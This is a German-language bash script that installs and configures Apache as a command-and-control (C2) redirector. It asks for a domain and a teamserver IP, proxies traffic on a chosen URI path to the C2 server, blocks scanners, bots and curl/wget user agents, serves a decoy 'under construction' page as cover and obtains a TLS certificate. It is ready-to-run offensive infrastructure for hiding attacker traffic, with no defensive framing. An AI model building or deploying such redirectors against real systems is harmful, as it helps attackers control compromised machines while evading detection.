#!/bin/bash
#
# Apache Redirector - Automatische Installation & Konfiguration
#
# Verwendung: sudo bash install_redirector_apache.sh
#
# Beschreibung: Installiert Apache mit mod_rewrite als C2-Redirector
#

set -e

# Farben
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║         Apache C2 Redirector - Automatische Installation     ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Root-Check
if [ "$EUID" -ne 0 ]; then 
    echo -e "${RED}[!] Bitte als root ausführen (sudo)${NC}"
    exit 1
fi

echo -e "${GREEN}[+] System wird aktualisiert...${NC}"
apt update -qq
apt upgrade -y -qq

echo -e "${GREEN}[+] Installiere Apache2 und Module...${NC}"
apt install -y apache2 certbot python3-certbot-apache ufw net-tools

echo -e "${GREEN}[+] Aktiviere Apache-Module...${NC}"
a2enmod rewrite proxy proxy_http ssl headers

echo -e "${GREEN}[+] Sammle Konfigurationsinformationen...${NC}"

read -p "Ihre Domain (z.B. example.com): " DOMAIN
if [ -z "$DOMAIN" ]; then
    echo -e "${RED}[!] Domain ist erforderlich!${NC}"
    exit 1
fi

read -p "C2 Teamserver IP-Adresse: " C2_IP
if [ -z "$C2_IP" ]; then
    echo -e "${RED}[!] C2 IP ist erforderlich!${NC}"
    exit 1
fi

read -p "C2 Listener Port (Standard: 443): " C2_PORT
C2_PORT=${C2_PORT:-443}

read -p "C2 URI Pfad (z.B. /api/v2/check, leer für alle): " C2_URI
C2_URI=${C2_URI:-/api}

read -p "Admin Email für SSL-Zertifikat: " ADMIN_EMAIL
ADMIN_EMAIL=${ADMIN_EMAIL:-admin@${DOMAIN}}

# Apache VHost-Konfiguration
echo -e "${GREEN}[+] Erstelle Apache-Konfiguration...${NC}"

cat > /etc/apache2/sites-available/redirector.conf << 'EOF'
<VirtualHost *:80>
    ServerName DOMAIN_PLACEHOLDER
    ServerAdmin ADMIN_EMAIL_PLACEHOLDER

    ErrorLog ${APACHE_LOG_DIR}/redirector_error.log
    CustomLog ${APACHE_LOG_DIR}/redirector_access.log combined

    RewriteEngine On

    # 1. Blockiere bekannte Scanner/Bots
    RewriteCond %{HTTP_USER_AGENT} ^.*(bot|spider|crawler|scanner|curl|wget|python|nmap|masscan).*$ [NC]
    RewriteRule ^.*$ - [F,L]

    # 2. Blockiere bekannte Scanner-IPs
    RewriteCond %{REMOTE_ADDR} ^192\.0\.2\. [OR]
    RewriteCond %{REMOTE_ADDR} ^198\.18\. [OR]
    RewriteCond %{REMOTE_ADDR} ^203\.0\.113\.
    RewriteRule ^.*$ - [F,L]

    # 3. C2 Traffic an Teamserver weiterleiten
    RewriteCond %{REQUEST_URI} ^C2_URI_PLACEHOLDER
    RewriteRule ^.*$ http://C2_IP_PLACEHOLDER:C2_PORT_PLACEHOLDER%{REQUEST_URI} [P,L]

    # 4. Fallback: Zeige normale Webseite
    DocumentRoot /var/www/html
    <Directory /var/www/html>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

    # Proxy-Konfiguration
    ProxyRequests Off
    ProxyPreserveHost On
    
    <Proxy *>
        Order deny,allow
        Allow from all
    </Proxy>
</VirtualHost>
EOF

# Platzhalter ersetzen
sed -i "s|DOMAIN_PLACEHOLDER|${DOMAIN}|g" /etc/apache2/sites-available/redirector.conf
sed -i "s|ADMIN_EMAIL_PLACEHOLDER|${ADMIN_EMAIL}|g" /etc/apache2/sites-available/redirector.conf
sed -i "s|C2_URI_PLACEHOLDER|${C2_URI}|g" /etc/apache2/sites-available/redirector.conf
sed -i "s|C2_IP_PLACEHOLDER|${C2_IP}|g" /etc/apache2/sites-available/redirector.conf
sed -i "s|C2_PORT_PLACEHOLDER|${C2_PORT}|g" /etc/apache2/sites-available/redirector.conf

echo -e "${GREEN}[+] Erstelle Fallback-Webseite...${NC}"
cat > /var/www/html/index.html << 'EOF'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 40px;
            background-color: #f4f4f4;
        }
        .container {
            background: white;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 { color: #333; }
        p { color: #666; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome</h1>
        <p>This website is currently under construction.</p>
        <p>Please check back later.</p>
    </div>
</body>
</html>
EOF

echo -e "${GREEN}[+] Aktiviere Redirector-Site...${NC}"
a2dissite 000-default.conf
a2ensite redirector.conf

echo -e "${GREEN}[+] Teste Apache-Konfiguration...${NC}"
apache2ctl configtest

echo -e "${GREEN}[+] Starte Apache neu...${NC}"
systemctl restart apache2

echo -e "${GREEN}[+] Konfiguriere Firewall...${NC}"
ufw --force enable
ufw allow 80/tcp comment "HTTP"
ufw allow 443/tcp comment "HTTPS"
ufw allow 22/tcp comment "SSH"

echo -e "${GREEN}[+] Prüfe ob DNS-Record existiert...${NC}"
CURRENT_IP=$(hostname -I | awk '{print $1}')
DOMAIN_IP=$(dig +short ${DOMAIN} | tail -n1)

if [ "$DOMAIN_IP" != "$CURRENT_IP" ]; then
    echo -e "${YELLOW}[!] Warnung: DNS-Record für ${DOMAIN} zeigt nicht auf diesen Server!${NC}"
    echo -e "${YELLOW}    Erwartet: ${CURRENT_IP}${NC}"
    echo -e "${YELLOW}    Aktuell:  ${DOMAIN_IP}${NC}"
    echo -e "${YELLOW}    Bitte DNS-Eintrag korrigieren bevor Sie SSL-Zertifikat anfordern.${NC}"
    SSL_SKIP=true
else
    echo -e "${GREEN}[✓] DNS-Record korrekt konfiguriert${NC}"
    SSL_SKIP=false
fi

# SSL-Zertifikat
if [ "$SSL_SKIP" = false ]; then
    echo -e "${GREEN}[+] Fordere Let's Encrypt SSL-Zertifikat an...${NC}"
    read -p "SSL-Zertifikat jetzt anfordern? (y/n) " -n 1 -r
    echo
    if [[ $REPLY =~ ^[Yy]$ ]]; then
        certbot --apache -d ${DOMAIN} --non-interactive --agree-tos -m ${ADMIN_EMAIL} --redirect
        
        if [ $? -eq 0 ]; then
            echo -e "${GREEN}[✓] SSL-Zertifikat erfolgreich installiert!${NC}"
            
            # HTTPS VHost updaten
            HTTPS_CONF="/etc/apache2/sites-available/redirector-le-ssl.conf"
            if [ -f "$HTTPS_CONF" ]; then
                # Füge erweiterte SSL-Konfiguration hinzu
                sed -i "/SSLCertificateKeyFile/a\\
    # Erweiterte SSL-Konfiguration\\
    SSLProtocol all -SSLv2 -SSLv3 -TLSv1 -TLSv1.1\\
    SSLCipherSuite HIGH:!aNULL:!MD5:!3DES\\
    SSLHonorCipherOrder on\\
    Header always set Strict-Transport-Security \"max-age=31536000\"" "$HTTPS_CONF"
                
                systemctl reload apache2
            fi
        else
            echo -e "${YELLOW}[!] SSL-Zertifikat konnte nicht installiert werden.${NC}"
            echo -e "${YELLOW}    Manuell ausführen: certbot --apache -d ${DOMAIN}${NC}"
        fi
    fi
fi

echo -e "${GREEN}"
echo "╔═══════════════════════════════════════════════════════════════╗"
echo "║                Installation abgeschlossen!                    ║"
echo "╚═══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo ""
echo -e "${GREEN}[✓] Apache Redirector installiert und konfiguriert${NC}"
echo ""
echo -e "${YELLOW}Konfigurationsinformationen:${NC}"
echo "  Domain: ${DOMAIN}"
echo "  Server-IP: ${CURRENT_IP}"
echo "  C2-Server: ${C2_IP}:${C2_PORT}"
echo "  C2-URI: ${C2_URI}"
echo ""
echo -e "${YELLOW}Wichtige Dateien:${NC}"
echo "  Config: /etc/apache2/sites-available/redirector.conf"
echo "  Logs:   /var/log/apache2/redirector_*.log"
echo "  Web:    /var/www/html/"
echo ""
echo -e "${YELLOW}Wichtige Kommandos:${NC}"
echo "  Status:      sudo systemctl status apache2"
echo "  Restart:     sudo systemctl restart apache2"
echo "  Logs:        sudo tail -f /var/log/apache2/redirector_access.log"
echo "  SSL erneuern: sudo certbot renew"
echo ""
echo -e "${YELLOW}Test:${NC}"
echo "  curl http://${DOMAIN}/"
if [ "$SSL_SKIP" = false ]; then
    echo "  curl https://${DOMAIN}/"
fi
echo ""
